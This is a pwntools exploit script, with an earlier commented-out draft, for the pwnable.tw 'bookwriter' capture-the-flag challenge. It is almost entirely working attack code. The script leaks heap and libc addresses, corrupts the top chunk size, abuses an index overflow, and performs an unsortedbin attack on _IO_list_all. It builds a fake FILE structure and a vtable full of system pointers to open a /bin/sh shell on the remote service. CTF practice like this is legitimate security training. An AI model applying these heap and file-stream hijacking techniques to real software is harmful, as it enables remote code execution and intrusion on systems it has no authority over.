from pwn import *
'''
#context.log_level = "debug"

binary = "./bookwriter"
e = ELF(binary)
libc = ELF("./libc_64.so.6")
r = remote("chall.pwnable.tw",10304)

r.sendafter("Author :","X"*0x40)

def add(size,content):
    r.sendafter("Your choice :","1")
    r.sendafter("Size of page :",str(size))
    r.sendafter("Content :",content)

def view(index):
    r.sendafter("Your choice :","2")
    r.sendafter("Index of page :",str(index))

def edit(index,content):
    r.sendafter("Your choice :","3")
    r.sendafter("Index of page :",str(index))
    r.sendafter("Content:",content)

def heap_leak():
    r.sendafter("Your choice :","4")
    r.recvuntil("X"*0x40)
    heap = u64(r.recvuntil("\n")[:-1].ljust(0x8,b"\x00"))
    r.sendlineafter("(yes:1 / no:0) ",str(0))
    return heap

def libc_leak():
    view(2)
    libc_base = u64(r.recvuntil("\x7f")[-6:] + b"\x00\x00")
    libc_base -= 0x3c3b20 + 1640
    return libc_base

num = 0x18
add(num,"A"*num)

edit(0,"B"*num)
edit(0,b"B"*num + p32(0xfe1))

add(0x1000,"C"*num)
add(0x10,"D"*8)
log.success("Free top chunk, top chunk = unsorted bin")

heap = heap_leak() - 0x10
libc_base = libc_leak()
IO_list_all = libc_base + libc.symbols["_IO_list_all"]
system = libc_base + libc.symbols["system"]
log.info("heap : " + hex(heap))
log.info("libc_base : " + hex(libc_base))
log.info("IO_list_all : " + hex(IO_list_all))
log.info("system : " + hex(system))

for i in range(8 - 3):
    add(num,"X"*num)

edit(0,"\x00")
add(num,"DDDD")
log.success("Off by one trigger")

payload = b""
payload += b"A" * 24 + p64(0x21)
payload = payload * 7 + b"A" * 0x10

IO_file = b""
IO_file += b"/bin/sh\x00" + p64(0x61) # prev_size, size
IO_file += b"A"* 8 + p64(IO_list_all - 0x10) # fd, bk
IO_file += p64(0) # write base
IO_file += p64(1) # write ptr
IO_file = IO_file.ljust(0xc0,b"\x00")
IO_file += p64(0) # mode
IO_file = IO_file.ljust(0xd8,b"\x00")
IO_file += p64(heap + 0x1e0)

IO_jump = b"\x00" * 0x18
IO_jump += p64(system)

payload += IO_file
payload += IO_jump

edit(0,payload)
edit(0,"\x00")

#r.sendafter("Your choice :","1")
#r.sendafter("Size of page :","32")

r.interactive()
'''
BEDUG = False

if BEDUG == True:
    io = process('./bookwriter')#, env={"LD_PRELOAD":"./libc_64.so.6"})
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    io = remote('chall.pwnable.tw', 10304)
    libc = ELF('./libc_64.so.6')

def add(size, content):
    print(io.recvuntil(b'Your choice :'))
    io.sendline(b'1')
    print(io.recvuntil(b'Size of page :'))
    if size == 24:
        io.sendline(str(size))
    else:
        io.sendline(str(size - 0x10))
    print(io.recvuntil(b'Content :'))
    io.send(content)

def view(index):
    print(io.recvuntil(b'Your choice :'))
    io.sendline(b'2')
    print(io.recvuntil(b'Index of page :'))
    io.sendline(str(index))

def edit(index, content):
    print(io.recvuntil(b'Your choice :'))
    io.sendline(b'3')
    print(io.recvuntil(b'Index of page :'))
    io.sendline(str(index))
    print(io.recvuntil(b'Content:'))
    io.send(content)

def change_author(new_name):
    print(io.recvuntil(b'Your choice :'))
    io.sendline(b'4')
    #print(io.recvuntil(b'Do you want to change the author ? (yes:1 / no:0) '))
    #io.sendline(b'1')
    #print(io.recvuntil(b'Author :'))
    #io.send(new_name)


def leak():
    print(io.recvuntil(b'Your choice :'))
    io.sendline(b'4')
    print(io.recvuntil(b'Author : '))
    print(io.recv(0x40))
    leak = u64(io.recv(4)+b'\0\0\0\0')
    print(io.recvuntil(b'Do you want to change the author ? (yes:1 / no:0) '))
    io.sendline(b'0')
    return leak


print(io.recvuntil(b'Author :'))
author = b'A'*0x40
io.send(author)
add(0x30, b'A') #0
heapbase = leak() -0x10
add(24, b'A') #1
edit(1, b'A'*24)
edit(1, b'A'*24+b'\xa1\x0f\0')
add(0x1000, b'A') #2 trigger syscall to make a unsortedbin
add(0x30, b'A') #3
add(0x30, b'A') #4 leak main arena - libc
view(4)
print(io.recvuntil(b'Content :\n'))
if BEDUG == True:
    libc.address = u64(io.recv(6)+b'\0\0') - 0x3c4b41
else:
    libc.address = u64(io.recv(6)+b'\0\0') - 0x3c4b41 + 0x1000


add(0x30, b'A') #5
add(0x30, b'A') #6
add(0x30, b'A') #7
edit(0, b'\0') # edit to perform index overflow
add(0x30, b'A') #8 index overflow

if BEDUG==True:
    chunk = heapbase + 0x1180
else:
    chunk = heapbase + 0x1180 - 0x1010 + 0x10

# craft fake stream

# satisfy condition:
# fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base

fake_stream = b'/bin//sh'
fake_stream += p64(0) # _IO_read_ptr
fake_stream += p64(0) # _IO_read_end
fake_stream += p64(0) # _IO_read_base
fake_stream += p64(0) # _IO_write_base
fake_stream += p64(0x1000) # _IO_write_ptr
fake_stream += p64(0) # _IO_write_end
fake_stream += p64(0) # _IO_buf_base
fake_stream += p64(0) # _IO_buf_end
fake_stream += p64(0) # _IO_save_base
fake_stream += p64(0) # _IO_backup_base
fake_stream += p64(0) # _IO_save_end
fake_stream += p64(0) # markers
fake_stream += p64(0) # _chain ptr
fake_stream += p64(3) # nice
fake_stream += p64(0xffffffffffffffff)
fake_stream += p64(0)
fake_stream += p64(0)
fake_stream += p64(0xffffffffffffffff)
fake_stream += p64(0)*8
vtable_addr = chunk + len(fake_stream) + 0x8
fake_stream += p64(vtable_addr)

#

# craft vtable jump

fake_vtable = p64(0)
fake_vtable += p64(0)
fake_vtable += p64(libc.sym['system']) # p64(libc.sym['_IO_new_file_finish'])
fake_vtable += p64(libc.sym['system']) # p64(libc.sym['_IO_new_file_overflow'])
fake_vtable += p64(libc.sym['system']) # p64(libc.sym['_IO_new_file_underflow'])
fake_vtable += p64(libc.sym['system']) # p64(libc.sym['__GI__IO_default_uflow'])
fake_vtable += p64(libc.sym['system']) # p64(libc.sym['__GI__IO_default_pbackfail'])
fake_vtable += p64(libc.sym['system']) # p64(libc.sym['_IO_new_file_xsputn'])
fake_vtable += p64(libc.sym['system']) # p64(libc.sym['__GI__IO_file_xsgetn'])
fake_vtable += p64(libc.sym['system']) # p64(libc.sym['_IO_new_file_seekoff'])
fake_vtable += p64(libc.sym['system']) # p64(libc.sym['_IO_default_seekpos'])
fake_vtable += p64(libc.sym['system']) # p64(libc.sym['_IO_new_file_setbuf'])
fake_vtable += p64(libc.sym['system']) # p64(libc.sym['_IO_new_file_sync'])
fake_vtable += p64(libc.sym['system']) # p64(libc.sym['__GI__IO_file_doallocate'])
fake_vtable += p64(libc.sym['system']) # p64(libc.sym['__GI__IO_file_read'])
fake_vtable += p64(libc.sym['system']) # p64(libc.sym['_IO_new_file_write'])
fake_vtable += p64(libc.sym['system']) # p64(libc.sym['__GI__IO_file_seek'])
fake_vtable += p64(libc.sym['system']) # p64(libc.sym['__GI__IO_file_close'])
fake_vtable += p64(libc.sym['system']) # p64(libc.sym['__GI__IO_file_stat'])
fake_vtable += p64(libc.sym['system']) # p64(libc.sym['_IO_default_showmanyc'])
fake_vtable += p64(libc.sym['system']) # p64(libc.sym['_IO_default_imbue'])
fake_vtable += p64(0) * 3


#

if BEDUG==True:
    '''
    padding = b'\0'*0x28+p64(0x1011)+p64(0xa30)+b'A'*0x1000+p64(0x21)+b'A'*0x18+(p64(0x31)+b'\0'*0x28)*4+p64(0x501)
    padding += fake_stream
    padding += fake_vtable
    padding += b'\0'*(0x1b0 - len(fake_stream) - len(fake_vtable) - 0x8) + p64(0x31)+b'A'*0x28
    payload = padding
    payload += p64(0x61) # fake unsorted chunk size to deliver it right into unsortedbin[4] of main_arena
    payload += p64(0) # unsorted fd ptr
    payload += p64(libc.sym['_IO_list_all']-0x10) # unsorted bk ptr, this right here perform unsortedbin attack
    payload += b'\0'*(0x68-0x20) # padding to reach _chain
    payload += p64(chunk)
    '''
    padding = b'\0'*0x28+p64(0x1011)+p64(0xa30)+b'A'*0x1000+p64(0x21)+b'A'*0x18+(p64(0x31)+b'\0'*0x28)*5+p64(0x31)+b'\0'*0x20
    payload = padding
    fs = b'/bin/sh\0'
    fs += p64(0x61) # fake unsorted chunk size to deliver it right into unsortedbin[4] of main_arena
    fs += p64(0) # unsorted fd ptr
    fs += p64(libc.sym['_IO_list_all']-0x10) # unsorted bk ptr, this right here perform unsortedbin attack
    fs += p64(0)
    fs += p64(0x1000)
    fs += p64(0) # _IO_write_end
    fs += p64(0) # _IO_buf_base
    fs += p64(0) # _IO_buf_end
    fs += p64(0) # _IO_save_base
    fs += p64(0) # _IO_backup_base
    fs += p64(0) # _IO_save_end
    fs += p64(0) # markers
    fs += p64(chunk) # _chain ptr
    fs += p64(3) # nice
    fs += p64(0xffffffffffffffff)
    fs += p64(0)
    fs += p64(0)
    fs += p64(0xffffffffffffffff)
    fs += p64(0)*8
    vtable_addr = chunk + len(fs) + 0x8
    fs += p64(vtable_addr)
    payload+=fs
    fvtable = p64(0)
    fvtable += p64(0)
    fvtable += p64(libc.sym['system']) # p64(libc.sym['_IO_new_file_finish'])
    fvtable += p64(libc.sym['system']) # p64(libc.sym['_IO_new_file_overflow'])
    fvtable += p64(libc.sym['system']) # p64(libc.sym['_IO_new_file_underflow'])
    payload+=fvtable
else:
    padding = b'\0'*0x28+p64(0x21)+b'A'*0x18+(p64(0x31)+b'\0'*0x28)*5+p64(0x31)+b'\0'*0x20
    payload = padding
    fs = b'/bin/sh\0'
    fs += p64(0x61) # fake unsorted chunk size to deliver it right into unsortedbin[4] of main_arena
    fs += p64(0) # unsorted fd ptr
    fs += p64(libc.sym['_IO_list_all']-0x10) # unsorted bk ptr, this right here perform unsortedbin attack
    fs += p64(0)
    fs += p64(0x1000)
    fs += p64(0) # _IO_write_end
    fs += p64(0) # _IO_buf_base
    fs += p64(0) # _IO_buf_end
    fs += p64(0) # _IO_save_base
    fs += p64(0) # _IO_backup_base
    fs += p64(0) # _IO_save_end
    fs += p64(0) # markers
    fs += p64(chunk) # _chain ptr
    fs += p64(3) # nice
    fs += p64(0xffffffffffffffff)
    fs += p64(0)
    fs += p64(0)
    fs += p64(0xffffffffffffffff)
    fs += p64(0)*8
    vtable_addr = chunk + len(fs) + 0x8
    fs += p64(vtable_addr)
    payload+=fs
    fvtable = p64(0)
    fvtable += p64(0)
    fvtable += p64(libc.sym['system']) # p64(libc.sym['_IO_new_file_finish'])
    fvtable += p64(libc.sym['system']) # p64(libc.sym['_IO_new_file_overflow'])
    fvtable += p64(libc.sym['system']) # p64(libc.sym['_IO_new_file_underflow'])
    payload+=fvtable


edit(0, payload)
print(io.recvuntil(b'Your choice :'))
io.sendline(b'1')
print(io.recvuntil(b'Size of page :'))
io.sendline(b'48')
log.info("LIBC: "+hex(libc.address))
log.info("HEAP: "+hex(heapbase))
print(len(payload))
io.interactive()